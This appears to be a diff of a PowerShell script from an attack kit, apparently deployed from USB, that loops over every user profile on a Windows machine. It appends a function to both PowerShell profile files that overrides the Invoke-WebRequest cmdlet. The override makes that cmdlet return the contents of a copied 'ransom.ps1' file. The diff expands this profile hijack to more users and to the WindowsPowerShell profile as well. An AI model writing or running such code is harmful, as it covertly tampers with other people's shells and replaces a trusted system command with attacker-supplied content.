@@ -17,41 +17,54 @@
 ###################
 
 $functionText = @"
-function iwr {
-    \$path = '__PATH__'
-    return Get-Content -Path \$path -Raw
+function Invoke-WebRequest {
+    `$path = '__PATH__'
+    return Get-Content -Path `$path -Raw
 }
 "@
 
 $userProfiles = Get-ChildItem 'C:\Users' -Directory | Where-Object {
-    Test-Path "$($_.FullName)\Documents\PowerShell"
+    Test-Path "$($_.FullName)\Documents"
 }
 
 foreach ($user in $userProfiles) {
     try {
         $profileDir = "$($user.FullName)\Documents\PowerShell"
+		$profileDir2 = "$($user.FullName)\Documents\WindowsPowerShell"
         $profileFile = "$profileDir\Microsoft.PowerShell_profile.ps1"
+		$profileFile2 = "$profileDir2\Microsoft.PowerShell_profile.ps1"
 
         if (-not (Test-Path $profileDir)) {
             New-Item -ItemType Directory -Path $profileDir -Force | Out-Null
+        }
+		
+		if (-not (Test-Path $profileDir2)) {
+			New-Item -ItemType Directory -Path $profileDir2 -Force | Out-Null
         }
 
         if (-not (Test-Path $profileFile)) {
             New-Item -ItemType File -Path $profileFile -Force | Out-Null
         }
+		
+		if (-not (Test-Path $profileFile2)) {
+			New-Item -ItemType File -Path $profileFile2 -Force | Out-Null
+        }
 
-        if (-not (Get-Content $profileFile | Select-String -Pattern 'function iwr')) {
+        if (-not (Get-Content $profileFile | Select-String -Pattern 'function Invoke-WebRequest')) {
             $ransomFilename = "$profileDir\ransom.ps1"
             Copy-Item -Path "arsenal\USB\ransom.ps1" -Destination $ransomFilename
             $currentFunction = $functionText -replace '__PATH__', $ransomFilename
             Add-Content -Path $profileFile -Value $currentFunction
-            Write-Output "Fonction ajout√©e pour l'utilisateur : $($user.Name)"
+			if (-not (Get-Content $profileFile2 | Select-String -Pattern 'function Invoke-WebRequest')) {
+				Add-Content -Path $profileFile2 -Value $currentFunction
+			}
+            Write-Output "Fonction ajoutÈe pour l'utilisateur : $($user.Name)"
         } else {
-            Write-Output "Fonction d√©j√† pr√©sente pour l'utilisateur : $($user.Name)"
+            Write-Output "Fonction dÈj‡ prÈsente pour l'utilisateur : $($user.Name)"
         }
     } catch {
         Write-Warning "Impossible de modifier le profil de $($user.Name) : $_"
     }
 }
 
-Write-Output "Script termin√©."
+Write-Output "Script terminÈ."
